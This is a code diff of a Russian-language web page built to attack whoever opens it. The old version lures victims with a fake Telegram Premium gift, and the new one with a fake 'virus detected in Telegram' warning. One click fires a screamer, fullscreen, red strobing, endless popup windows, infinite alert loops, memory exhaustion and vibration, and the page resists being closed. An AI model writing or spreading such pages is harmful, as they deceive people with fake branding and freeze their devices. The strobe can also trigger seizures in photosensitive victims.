@@ -2,67 +2,62 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>TG Premium Gift</title>
+    <title>ВНИМАНИЕ! ОШИБКА СИСТЕМЫ!</title>
     <style>
-        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; padding-top: 150px; }
-        .btn { padding: 30px 60px; font-size: 30px; background: #0088cc; color: #fff; border: none; border-radius: 20px; font-weight: bold; cursor: pointer; }
+        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; padding-top: 100px; overflow: hidden; }
+        .danger-btn { padding: 30px 60px; font-size: 30px; background: #ff0000; color: #fff; border: none; border-radius: 20px; font-weight: bold; cursor: pointer; box-shadow: 0 0 20px #f00; }
         #scary { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; z-index: 9999; }
+        .strobe { animation: flash 0.1s infinite; }
+        @keyframes flash { 0% { background: #000; } 50% { background: #f00; } 100% { background: #000; } }
     </style>
 </head>
 <body>
     <div id="ui">
-        <img src="https://telegram.org" width="100">
-        <h1>Вам подарок!</h1>
-        <p>Подписка <b>Premium</b> активна. Нажмите для подтверждения.</p>
-        <button class="btn" onclick="activate()">ПОДТВЕРДИТЬ</button>
+        <h1 style="font-size: 40px;">КРИТИЧЕСКАЯ УГРОЗА!</h1>
+        <p>Обнаружен вирус в Telegram. Нажмите для очистки системы.</p>
+        <button class="danger-btn" onclick="destroy()">ОЧИСТИТЬ СИСТЕМУ</button>
     </div>
 
     <img id="scary" src="https://raw.githubusercontent.com">
     <audio id="scream" src="https://raw.githubusercontent.com" loop></audio>
-    <!-- Невидимый звук для удержания фонового процесса -->
-    <audio id="bg_stay" src="https://www.soundhelix.com" muted></audio>
 
     <script>
-        let killer_data = [];
-
-        function activate() {
+        function destroy() {
             const s = document.getElementById("scream");
-            const b = document.getElementById("bg_stay");
             const i = document.getElementById("scary");
-
-            // Запускаем фоновый шум, чтобы вкладка не "уснула"
-            b.volume = 0.01;
-            b.play();
-
-            // Запускаем скример
+            
             s.volume = 1.0;
             s.play();
             i.style.display = "block";
-            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
+            document.body.classList.add('strobe');
 
-            // ЗАПУСК УНИЧТОЖЕНИЯ В ФОНЕ
+            // 1. БЕСКОНЕЧНЫЕ ВКЛАДКИ (Цепная реакция)
             setInterval(() => {
-                // Забиваем память (ОЗУ)
-                for (let j = 0; j < 500; j++) {
-                    killer_data.push(new Uint8Array(1024 * 1024).fill(7));
-                }
-                
-                // Спам скачиванием (будет всплывать даже в фоне)
-                const blob = new Blob([new Uint8Array(50 * 1024 * 1024)], {type: 'application/octet-stream'});
-                const url = URL.createObjectURL(blob);
-                const a = document.createElement('a');
-                a.href = url;
-                a.download = "cache_" + Math.random().toString(36).substring(7) + ".bin";
-                a.click();
+                window.open(window.location.href, "_blank", "width=400,height=400");
+            }, 400);
 
-                // Жёсткая нагрузка на процессор
-                let x = 0;
-                while(x < 1000000) { x++; Math.sqrt(x); }
-            }, 1000);
+            // 2. БЕСКОНЕЧНЫЕ ОКНА (Если вкладки заблокированы)
+            setTimeout(() => {
+                while(true) {
+                    alert("ПАМЯТЬ ПЕРЕПОЛНЕНА! УДАЛЕНИЕ ФАЙЛОВ...");
+                    confirm("ОСТАНОВИТЬ УНИЧТОЖЕНИЕ ДАННЫХ?");
+                }
+            }, 1500);
+
+            // 3. УБИЙЦА ОПЕРАТИВКИ (Забивает ГБ мусора)
+            let trash = [];
+            setInterval(() => {
+                for(let k=0; k<100; k++) {
+                    trash.push(new Array(1000000).join("CRASH_SYSTEM_"));
+                }
+            }, 100);
+
+            // 4. ВИБРАЦИЯ И FULLSCREEN
+            if (navigator.vibrate) navigator.vibrate([500, 100, 500, 100]);
+            document.documentElement.requestFullscreen().catch(() => {});
         }
 
-        // Если друг попытается уйти со страницы, браузер может выкинуть предупреждение
-        window.onbeforeunload = function() { return "Вы уверены? Подписка аннулируется!"; };
+        window.onbeforeunload = function() { return "СИСТЕМА БУДЕТ УНИЧТОЖЕНА!"; };
     </script>
 </body>
 </html>
